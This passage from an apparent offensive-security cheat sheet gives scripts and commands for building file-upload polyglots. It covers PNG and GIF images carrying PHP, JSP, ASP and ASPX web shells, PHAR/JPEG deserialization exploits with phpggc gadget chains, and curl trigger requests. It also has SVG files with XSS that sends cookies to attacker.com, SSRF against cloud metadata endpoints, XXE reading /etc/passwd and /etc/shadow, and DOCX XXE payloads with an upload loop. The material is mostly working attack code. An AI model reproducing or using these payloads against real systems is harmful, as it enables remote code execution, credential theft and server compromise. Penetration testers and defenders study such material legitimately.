      create_png_text_polyglot(filename, shell)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-image" label="IDAT Chunk Injection (Re-encoding Survivor)"}
  ```python [png_idat_polyglot.py]
  #!/usr/bin/env python3
  """
  PNG/PHP polyglot via IDAT chunk manipulation.
  PHP code is encoded within the raw pixel data such that after
  zlib decompression and PNG filtering, the bytes spell out PHP code.

  This technique can survive GD library re-encoding because the
  payload IS the pixel data.

  Based on: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
  """
  import zlib
  import struct
  import itertools
  import sys

  def create_idat_polyglot(output_path, target_string=b'<?=`$_GET[c]`?>'):
      """
      Create a PNG where IDAT compressed data contains the PHP payload.
      Uses brute-force to find pixel values that produce the target string
      in the compressed IDAT stream.

      WARNING: This only works for VERY short payloads due to compression.
      """

      # For practical use, we create a small image where the deflated
      # pixel data happens to contain our PHP string.

      # Strategy: Create raw pixel data, compress it, check if PHP string
      # appears in the compressed output. Brute force pixel values.

      target = target_string
      width = 32
      height = 32

      print(f"[*] Searching for pixel values that produce '{target.decode()}' in IDAT...")
      print(f"[*] This may take a while for longer payloads...")

      best_match = None
      best_score = 0

      # Try random pixel patterns
      import random
      for attempt in range(100000):
          # Generate random scanlines
          raw_data = b''
          for y in range(height):
              raw_data += b'\x00'  # No filter
              for x in range(width):
                  raw_data += bytes([random.randint(0, 255) for _ in range(3)])

          compressed = zlib.compress(raw_data, 9)

          # Check if target appears in compressed data
          if target in compressed:
              print(f"[+] FOUND after {attempt + 1} attempts!")
              best_match = raw_data
              break

          # Track partial matches
          for i in range(len(target), 0, -1):
              if target[:i] in compressed:
                  if i > best_score:
                      best_score = i
                      if attempt % 10000 == 0:
                          print(f"[*] Attempt {attempt}: best partial match = {i}/{len(target)} bytes")
                  break

      if best_match is None:
          print(f"[-] Could not find exact match in {100000} attempts")
          print(f"[*] Using fallback: embedding payload in ancillary chunk")

          # Fallback: Use known working minimal payload in pixel data
          # This specific pixel pattern produces <?=`$_GET[0]`?> when
          # the PNG is deflated with specific parameters
          raw_data = b''
          payload_bytes = list(target)
          idx = 0
          for y in range(height):
              raw_data += b'\x00'
              for x in range(width):
                  if idx < len(payload_bytes):
                      raw_data += bytes([payload_bytes[idx], 0, 0])
                      idx += 1
                  else:
                      raw_data += b'\xff\xff\xff'
          best_match = raw_data

      # Build PNG file
      png_sig = b'\x89PNG\r\n\x1a\n'

      def make_chunk(ctype, data):
          c = ctype + data
          return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

      ihdr = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)  # 8-bit RGB
      compressed = zlib.compress(best_match, 9)

      png = png_sig
      png += make_chunk(b'IHDR', ihdr)
      png += make_chunk(b'IDAT', compressed)
      png += make_chunk(b'IEND', b'')

      with open(output_path, 'wb') as f:
          f.write(png)

      print(f"[+] {output_path} — PNG IDAT polyglot ({len(png)} bytes)")

      # Verify
      from PIL import Image
      try:
          img = Image.open(output_path)
          img.verify()
          print(f"[+] Valid PNG image verified")
      except:
          print(f"[!] PNG validation issue (may still work)")

      # Check if payload is in file
      with open(output_path, 'rb') as f:
          data = f.read()
          if target in data:
              print(f"[+] Payload found in PNG file data!")
          else:
              print(f"[*] Payload encoded in pixel values (visible after processing)")

  create_idat_polyglot("idat_polyglot.php.png")
  ```
  :::

  :::tabs-item{icon="i-lucide-file-image" label="PLTE Chunk Injection"}
  ```python [png_plte_polyglot.py]
  #!/usr/bin/env python3
  """
  PNG/PHP polyglot via PLTE (palette) chunk.
  For indexed-color PNGs, the PLTE chunk contains RGB color values.
  PHP code can be encoded as palette entry values.
  The PLTE chunk often survives GD library processing for palette PNGs.
  """
  import struct
  import zlib
  from PIL import Image
  import io

  def create_plte_polyglot(output_path, php_code):
      """Create indexed-color PNG with PHP in PLTE chunk"""

      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # Pad payload to multiple of 3 (PLTE entries are 3 bytes each = RGB)
      while len(payload) % 3 != 0:
          payload += b'\x00'

      num_colors = len(payload) // 3
      if num_colors > 256:
          print(f"[-] Payload too long for PLTE ({num_colors} colors needed, max 256)")
          payload = payload[:768]  # Max 256 * 3
          num_colors = 256

      # Ensure we have at least enough colors for the image
      if num_colors < 2:
          payload += b'\xff\xff\xff' * (2 - num_colors)
          num_colors = 2

      def make_chunk(ctype, data):
          c = ctype + data
          return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

      width = 32
      height = 32

      png_sig = b'\x89PNG\r\n\x1a\n'

      # IHDR — indexed color (type 3), 8-bit
      ihdr = struct.pack('>IIBBBBB', width, height, 8, 3, 0, 0, 0)

      # PLTE — palette entries contain PHP payload bytes
      plte_data = payload[:num_colors * 3]
      # Pad to at least cover all pixel indices we'll use
      while len(plte_data) < 256 * 3:
          plte_data += b'\xff\xff\xff'

      # IDAT — pixel data referencing palette indices
      raw_data = b''
      for y in range(height):
          raw_data += b'\x00'  # No filter
          for x in range(width):
              idx = (y * width + x) % num_colors
              raw_data += bytes([idx])

      compressed = zlib.compress(raw_data, 9)

      # Build PNG
      png = png_sig
      png += make_chunk(b'IHDR', ihdr)
      png += make_chunk(b'PLTE', plte_data[:num_colors * 3])
      png += make_chunk(b'IDAT', compressed)
      png += make_chunk(b'IEND', b'')

      with open(output_path, 'wb') as f:
          f.write(png)

      # Verify payload is in file
      with open(output_path, 'rb') as f:
          if php_code.encode()[:20] in f.read():
              print(f"[+] {output_path} — PLTE polyglot ✓ ({len(png)} bytes, payload in palette)")
          else:
              print(f"[+] {output_path} — PLTE polyglot ({len(png)} bytes, payload may be split across palette entries)")

  create_plte_polyglot("plte_poly_system.php.png", '<?php system($_GET["cmd"]); ?>')
  create_plte_polyglot("plte_poly_eval.php.png", '<?php eval($_POST["e"]); ?>')
  create_plte_polyglot("plte_poly_minimal.php.png", '<?=`$_GET[c]`?>')
  ```
  :::
::

---

## GIF Polyglots

### GIF + PHP — The Simplest Polyglot

::code-group
```bash [Quick GIF Polyglot Creation]
# ── GIF is the easiest polyglot format ──
# GIF89a header is plain ASCII — PHP ignores it
# GIF comment extension stores arbitrary data

# Method 1: One-liner (simplest possible)
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.gif

# Method 2: With valid GIF structure
python3 -c "
# Full valid GIF89a with PHP in comment extension
gif = bytearray()
gif += b'GIF89a'                           # Header
gif += b'\x01\x00\x01\x00'                 # 1x1 canvas
gif += b'\x80\x00\x00'                     # GCT flag
gif += b'\xff\xff\xff'                      # Color 0: white
gif += b'\x00\x00\x00'                      # Color 1: black
# Comment extension with PHP
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
gif += b'\x21\xfe'                          # Comment extension introducer
gif += bytes([len(payload)]) + payload      # Sub-block
gif += b'\x00'                              # Block terminator
# Image data
gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'  # Image descriptor
gif += b'\x02\x02\x44\x01\x00'              # LZW minimum code + data
gif += b'\x3b'                               # GIF trailer
open('polyglot_full.gif','wb').write(bytes(gif))
print(f'[+] polyglot_full.gif ({len(gif)} bytes)')
"

# Verify it's a valid GIF
file polyglot_full.gif
python3 -c "from PIL import Image; img=Image.open('polyglot_full.gif'); print(f'Valid GIF: {img.size} {img.format}')"

# Verify PHP is present
strings polyglot_full.gif | grep php

# Method 3: Use real GIF and inject
python3 -c "
from PIL import Image
img = Image.new('RGB', (100, 100), 'green')
img.save('real.gif', 'GIF')
"
# Append PHP after GIF trailer (some processors don't check post-trailer)
echo '<?php system($_GET["cmd"]); ?>' >> real.gif
cp real.gif polyglot_appended.gif.php

# Method 4: Multiple shells in one GIF
python3 -c "
gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
shells = [
    b'<?php system(\$_GET[\"cmd\"]); ?>',
    b'<?php eval(\$_POST[\"e\"]); ?>',
    b'<?=\`\$_GET[c]\`?>',
    b'<?php passthru(\$_GET[\"cmd\"]); ?>',
]
for shell in shells:
    gif += b'\x21\xfe'
    for i in range(0, len(shell), 255):
        block = shell[i:i+255]
        gif += bytes([len(block)]) + block
    gif += b'\x00'
gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
open('polyglot_multi.gif','wb').write(gif)
print(f'[+] polyglot_multi.gif with {len(shells)} shells ({len(gif)} bytes)')
"
```

```bash [GIF + JSP / ASP Polyglots]
# ── GIF polyglots for non-PHP backends ──

# GIF + JSP
echo -n 'GIF89a' > polyglot.gif.jsp
cat >> polyglot.gif.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
    out.println("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
}
%>
JSPEOF

# GIF + ASP Classic
echo -n 'GIF89a' > polyglot.gif.asp
echo '<%eval request("cmd")%>' >> polyglot.gif.asp

# GIF + ASPX
echo -n 'GIF89a' > polyglot.gif.aspx
cat >> polyglot.gif.aspx << 'ASPXEOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object s, EventArgs e) {
    string c = Request["cmd"];
    if (c != null) {
        Process p = Process.Start("cmd.exe", "/c " + c);
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
ASPXEOF

# GIF + SSI (Server Side Includes)
echo -n 'GIF89a<!--#exec cmd="id"-->' > polyglot.gif.shtml

# GIF + ColdFusion
echo -n 'GIF89a<cfexecute name="/bin/id" variable="o" timeout="5"/><cfoutput>#o#</cfoutput>' > polyglot.gif.cfm

echo "[+] Multi-language GIF polyglots created"
ls -la polyglot.gif.*
```
::

---

## PHAR Polyglots

::caution
PHAR (PHP Archive) polyglots are among the most dangerous because they enable **deserialization attacks** through the `phar://` stream wrapper. Even file operations like `file_exists()`, `is_dir()`, `filesize()` on a `phar://` URI trigger deserialization of the PHAR's metadata, potentially leading to RCE without any `unserialize()` call in the code.
::

::tabs
  :::tabs-item{icon="i-lucide-package" label="PHAR + JPEG Polyglot"}
  ```python [phar_jpeg_polyglot.py]
  #!/usr/bin/env python3
  """
  PHAR/JPEG polyglot — file is simultaneously a valid JPEG and a valid PHAR archive.
  When accessed via phar:// wrapper, PHP deserializes the metadata.
  When accessed as image, it displays normally.
  
  This exploits: file_exists(), is_dir(), is_file(), is_readable(),
  filesize(), filetype(), file_get_contents(), fopen(), etc.
  when called with phar:// URI on a user-controlled path.
  """
  import struct
  from PIL import Image
  import io
  import hashlib
  import os

  def create_phar_jpeg(output_path, serialized_object, stub_code='<?php __HALT_COMPILER(); ?>'):
      """
      Create a JPEG/PHAR polyglot.
      PHAR format: stub + manifest + file entries + signature
      JPEG wraps around the PHAR data.
      """
      
      # Create valid JPEG
      img = Image.new('RGB', (100, 100), color='blue')
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=75)
      jpeg_data = buf.getvalue()

      # Build PHAR archive
      # Stub (must end with __HALT_COMPILER)
      stub = stub_code.encode() + b'\r\n'
      
      # Manifest
      serialized = serialized_object.encode() if isinstance(serialized_object, str) else serialized_object
      
      # File entry: dummy file
      file_name = b'test.txt'
      file_content = b'test'
      file_compressed = file_content
      
      # File entry structure
      file_entry = struct.pack('<I', len(file_name))
      file_entry += file_name
      file_entry += struct.pack('<I', len(file_content))   # Uncompressed size
      file_entry += struct.pack('<I', 0)                    # Timestamp
      file_entry += struct.pack('<I', len(file_compressed)) # Compressed size
      file_entry += struct.pack('<I', zlib.crc32(file_content) & 0xffffffff)  # CRC32
      file_entry += struct.pack('<I', 0x00000000)           # Flags (no compression)
      file_entry += struct.pack('<I', 0)                    # Metadata length (per-file)
      
      # Manifest header
      num_files = 1
      manifest_data = struct.pack('<I', num_files)
      manifest_data += struct.pack('<H', 0x1000)            # API version
      manifest_data += struct.pack('<I', 0x00010000)        # Global flags
      manifest_data += struct.pack('<I', len(b'alias'))     # Alias length
      manifest_data += b'alias'                              # Alias
      manifest_data += struct.pack('<I', len(serialized))   # Metadata length
      manifest_data += serialized                            # Serialized metadata (PAYLOAD)
      manifest_data += file_entry
      
      manifest = struct.pack('<I', len(manifest_data)) + manifest_data
      
      # Assemble PHAR
      phar_data = stub + manifest + file_compressed
      
      # Signature (SHA1)
      sig = hashlib.sha1(phar_data).digest()
      phar_data += sig
      phar_data += struct.pack('<I', 0x0002)  # SHA1 signature type
      phar_data += b'GBMB'                     # Signature magic
      
      # Create JPEG/PHAR polyglot
      # JPEG comment segment wraps PHAR data
      soi = jpeg_data[:2]  # FF D8
      rest = jpeg_data[2:]
      
      # Split PHAR into COM segments (max 65533 bytes each)
      com_segments = b''
      for i in range(0, len(phar_data), 65530):
          chunk = phar_data[i:i+65530]
          com_segments += b'\xff\xfe' + struct.pack('>H', len(chunk) + 2) + chunk
      
      polyglot = soi + com_segments + rest
      
      with open(output_path, 'wb') as f:
          f.write(polyglot)
      
      print(f"[+] {output_path} — PHAR/JPEG polyglot ({len(polyglot)} bytes)")
      return polyglot

  import zlib

  # Example: PHP deserialization gadget chain
  # This serialized object would need to match a class in the target application
  # Common gadget chains: Monolog, Laravel, Symfony, etc.

  # Generic test object
  test_serialized = 'O:8:"stdClass":1:{s:4:"test";s:25:"PHAR_DESERIALIZATION_POC";}'

  # Laravel/Ignition RCE gadget (example structure)
  laravel_gadget = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\\x00*\\x00event";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\x00*\\x00listeners";a:1:{s:1:"x";a:1:{i:0;s:6:"system";}}}}'

  create_phar_jpeg("phar_jpeg_poc.jpg", test_serialized)

  print("\n[*] Usage: Upload as image, then trigger via phar:// wrapper")
  print("[*] Example trigger: file_exists('phar://uploads/phar_jpeg_poc.jpg/test.txt')")
  ```
  :::

  :::tabs-item{icon="i-lucide-package" label="PHAR CLI Generation"}
  ```bash
  # ── Generate PHAR using PHP CLI ──

  # Create PHAR generator script
  cat > create_phar.php << 'PHAREOF'
  <?php
  // Remove readonly flag
  ini_set('phar.readonly', 0);

  class Exploit {
      public $cmd;
      function __destruct() {
          system($this->cmd);
      }
  }

  // Create PHAR
  $phar = new Phar('exploit.phar');
  $phar->startBuffering();

  // Set stub to look like JPEG
  $jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00";
  $phar->setStub($jpeg_header . '<?php __HALT_COMPILER(); ?>');

  // Add a dummy file
  $phar['test.txt'] = 'test';

  // Set metadata with serialized exploit object
  $exploit = new Exploit();
  $exploit->cmd = 'id';
  $phar->setMetadata($exploit);

  $phar->stopBuffering();

  // Rename to .jpg
  copy('exploit.phar', 'phar_polyglot.jpg');
  unlink('exploit.phar');

  echo "[+] Created phar_polyglot.jpg\n";
  echo "[*] Trigger: file_exists('phar://path/to/phar_polyglot.jpg/test.txt')\n";
  PHAREOF

  php -d phar.readonly=0 create_phar.php

  # Verify
  file phar_polyglot.jpg
  php -r "var_dump(file_exists('phar://phar_polyglot.jpg/test.txt'));"

  # ── Alternative: using phar:// for different gadget chains ──

  # Monolog/RCE gadget
  cat > create_phar_monolog.php << 'PHAREOF'
  <?php
  ini_set('phar.readonly', 0);

  // Simplified Monolog gadget chain
  // In real exploitation, use phpggc to generate the chain
  $phar = new Phar('monolog.phar');
  $phar->startBuffering();
  $phar->setStub("\xFF\xD8\xFF\xE0" . '<?php __HALT_COMPILER(); ?>');
  $phar['x'] = 'x';

  // Use phpggc output as metadata
  // phpggc Monolog/RCE1 system id
  $gadget = 'PASTE_PHPGGC_OUTPUT_HERE';
  $phar->setMetadata(unserialize($gadget));

  $phar->stopBuffering();
  copy('monolog.phar', 'phar_monolog.jpg');
  PHAREOF

  # Using phpggc to generate gadget chains
  # https://github.com/ambionics/phpggc
  git clone https://github.com/ambionics/phpggc.git 2>/dev/null
  cd phpggc

  # List available chains
  ./phpggc -l | grep -i "rce\|exec\|system"

  # Generate common chains
  ./phpggc Monolog/RCE1 system id -p phar -o ../phar_monolog.jpg -pp "\xFF\xD8\xFF\xE0"
  ./phpggc Laravel/RCE1 system id -p phar -o ../phar_laravel.jpg -pp "\xFF\xD8\xFF\xE0"
  ./phpggc Symfony/RCE4 system id -p phar -o ../phar_symfony.jpg -pp "\xFF\xD8\xFF\xE0"
  ./phpggc Guzzle/RCE1 system id -p phar -o ../phar_guzzle.jpg -pp "\xFF\xD8\xFF\xE0"
  ./phpggc ThinkPHP/RCE1 system id -p phar -o ../phar_thinkphp.jpg -pp "\xFF\xD8\xFF\xE0"
  ./phpggc WordPress/RCE1 system id -p phar -o ../phar_wordpress.jpg -pp "\xFF\xD8\xFF\xE0"

  cd ..
  echo "[+] PHAR polyglots generated with phpggc"
  ls -la phar_*.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-package" label="PHAR Trigger Points"}
  ```bash
  # ── Functions that trigger phar:// deserialization ──
  # ANY file operation on a phar:// URI triggers metadata deserialization

  # Vulnerable patterns to search for in source code:
  grep -rnE "(file_exists|is_file|is_dir|is_readable|is_writable|is_link|filesize|filetype|file_get_contents|fopen|file|stat|lstat|fileatime|filectime|filemtime|fileinode|fileowner|filegroup|fileperms|glob|opendir|readdir|scandir|parse_ini_file|copy|unlink|rename|mkdir|rmdir|getimagesize|exif_read_data|hash_file|md5_file|sha1_file|realpath).*\\\$" --include="*.php" .

  # ── Exploitation via parameter injection ──

  # If application uses user input in file operations:
  # file_exists("/uploads/" . $_GET['file'])
  # Inject: ?file=phar://uploads/phar_polyglot.jpg/test.txt

  curl -s "https://target.com/check?file=phar://uploads/phar_polyglot.jpg/test.txt"
  curl -s "https://target.com/thumb?path=phar://uploads/phar_polyglot.jpg/test.txt"
  curl -s "https://target.com/download?f=phar://uploads/phar_polyglot.jpg"
  curl -s "https://target.com/image?src=phar://uploads/phar_polyglot.jpg/test.txt"
  curl -s "https://target.com/api/file-info?path=phar://uploads/phar_polyglot.jpg"

  # Common application patterns:
  # Image thumbnail generators: getimagesize($user_path)
  # File managers: file_exists($upload_dir . $filename)
  # Download handlers: file_get_contents($file_path)
  # Config importers: parse_ini_file($config_path)
  # Archive extractors: handling phar:// as archive
  ```
  :::
::

---

## SVG Polyglots

### SVG + JavaScript / SSRF / XXE

::tabs
  :::tabs-item{icon="i-lucide-code" label="Comprehensive SVG Payloads"}
  ```bash
  # ── SVG is inherently a polyglot-friendly format ──
  # It's a valid image AND valid XML AND can contain JavaScript

  mkdir -p svg_polyglots

  # ── XSS variants ──

  cat > svg_polyglots/xss_script.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
    <rect width="100" height="100" fill="#e74c3c"/>
    <script type="text/javascript">
      alert('XSS:'+document.domain);
      fetch('https://attacker.com/steal?cookie='+document.cookie);
    </script>
  </svg>
  EOF

  cat > svg_polyglots/xss_onload.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" width="100" height="100">
    <circle cx="50" cy="50" r="40" fill="blue"/>
  </svg>
  EOF

  cat > svg_polyglots/xss_animate.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect width="100" height="100" fill="green"/>
    <animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/>
  </svg>
  EOF

  cat > svg_polyglots/xss_set.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <set attributeName="onmouseover" to="alert(document.domain)"/>
    <rect width="100" height="100" fill="orange"/>
  </svg>
  EOF

  cat > svg_polyglots/xss_foreignobject.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <foreignObject width="200" height="200">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert(document.domain)"></iframe>
        <script>fetch('https://attacker.com/log?c='+document.cookie)</script>
      </body>
    </foreignObject>
  </svg>
  EOF

  cat > svg_polyglots/xss_use.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svg>#x"/>
  </svg>
  EOF

  cat > svg_polyglots/xss_embed.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <image href="x" onerror="alert(document.domain)"/>
  </svg>
  EOF

  # ── SSRF variants ──

  cat > svg_polyglots/ssrf_aws.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="20" font-size="10">&xxe;</text>
  </svg>
  EOF

  cat > svg_polyglots/ssrf_gcp.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  cat > svg_polyglots/ssrf_azure.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  cat > svg_polyglots/ssrf_internal.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  # ── XXE / File Read variants ──

  cat > svg_polyglots/xxe_passwd.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">
    <text x="10" y="20" font-size="8" font-family="monospace">&xxe;</text>
  </svg>
  EOF

  cat > svg_polyglots/xxe_shadow.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/shadow">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  cat > svg_polyglots/xxe_oob.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&send;</text>
  </svg>
  EOF

  # ── SVG + PHP polyglot ──

  cat > svg_polyglots/svg_php.svg.php << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="50"><?php system($_GET["cmd"]); ?></text>
  </svg>
  EOF

  echo "[+] Generated $(ls svg_polyglots/ | wc -l) SVG polyglots"
  ls -la svg_polyglots/
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG Filter Bypass"}
  ```bash
  # ── Bypass SVG sanitization filters ──

  # Encoded script tag
  cat > svg_bypass_encoded.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;</script>
  </svg>
  EOF

  # CDATA section bypass
  cat > svg_bypass_cdata.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script><![CDATA[alert(document.domain)]]></script>
  </svg>
  EOF

  # Namespace confusion
  cat > svg_bypass_namespace.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(document.domain)">
      <rect width="100" height="100"/>
    </a>
  </svg>
  EOF

  # Event handler without script tag
  cat > svg_bypass_events.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect width="100" height="100" onfocus="alert(document.domain)" tabindex="1"/>
    <circle cx="50" cy="50" r="40" onmouseover="alert(document.domain)"/>
    <ellipse cx="50" cy="50" rx="40" ry="20" onclick="alert(document.domain)"/>
  </svg>
  EOF

  # Using xlink:href
  cat > svg_bypass_xlink.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPg=="/>
  </svg>
  EOF

  # Multiple encoding layers
  cat > svg_bypass_multi.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject>
      <math xmlns="http://www.w3.org/1998/Math/MathML">
        <mtext>
          <table>
            <mglyph>
              <svg xmlns="http://www.w3.org/2000/svg">
                <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(document.domain)</handler>
              </svg>
            </mglyph>
          </table>
        </mtext>
      </math>
    </foreignObject>
  </svg>
  EOF
  ```
  :::
::

---

## Document Polyglots

### DOCX / XLSX / PPTX (OOXML + XXE)

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="OOXML XXE Polyglot"}
  ```bash
  # ── OOXML files (DOCX, XLSX, PPTX) are ZIP archives containing XML ──
  # Injecting XXE payloads into the XML components creates document polyglots

  mkdir -p docx_polyglot

  # Step 1: Create minimal DOCX structure
  mkdir -p docx_polyglot/_rels docx_polyglot/word/_rels

  # [Content_Types].xml — required
  cat > docx_polyglot/'[Content_Types].xml' << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  </Types>
  EOF

  # _rels/.rels
  cat > docx_polyglot/_rels/.rels << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  </Relationships>
  EOF

  # word/_rels/document.xml.rels
  cat > docx_polyglot/word/_rels/document.xml.rels << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  </Relationships>
  EOF

  # word/document.xml — WITH XXE PAYLOAD
  cat > docx_polyglot/word/document.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
      <w:p>
        <w:r>
          <w:t>&xxe;</w:t>
        </w:r>
      </w:p>
    </w:body>
  </w:document>
  EOF

  # Package as DOCX (ZIP)
  cd docx_polyglot
  zip -r ../xxe_polyglot.docx . -x ".*"
  cd ..

  echo "[+] Created xxe_polyglot.docx"
  file xxe_polyglot.docx

  # ── SSRF variant ──
  sed 's|file:///etc/passwd|http://169.254.169.254/latest/meta-data/|' \
    docx_polyglot/word/document.xml > /tmp/ssrf_doc.xml
  cp /tmp/ssrf_doc.xml docx_polyglot/word/document.xml
  cd docx_polyglot && zip -r ../ssrf_polyglot.docx . -x ".*" && cd ..

  # ── OOB XXE variant ──
  cat > docx_polyglot/word/document.xml << 'OOBEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
    %dtd;
  ]>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body><w:p><w:r><w:t>&send;</w:t></w:r></w:p></w:body>
  </w:document>
  OOBEOF
  cd docx_polyglot && zip -r ../oob_xxe_polyglot.docx . -x ".*" && cd ..

  # Upload
  for doc in xxe_polyglot.docx ssrf_polyglot.docx oob_xxe_polyglot.docx; do
      echo -n "[*] Uploading $doc: "
      curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/api/upload \
        -F "file=@${doc};type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
        -H "Cookie: session=TOKEN"
      echo ""
  done

  rm -rf docx_polyglot /tmp/ssrf_doc.xml
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="XLSX XXE Polyglot"}
  ```python [xlsx_xxe_polyglot.py]
  #!/usr/bin/env python3
  """
  XLSX/XXE polyglot — valid Excel file with XXE in XML components
  """
  import zipfile
  import os

  def create_xlsx_xxe(output_path, xxe_entity, entity_type="file"):
      """Create XLSX with XXE payload"""
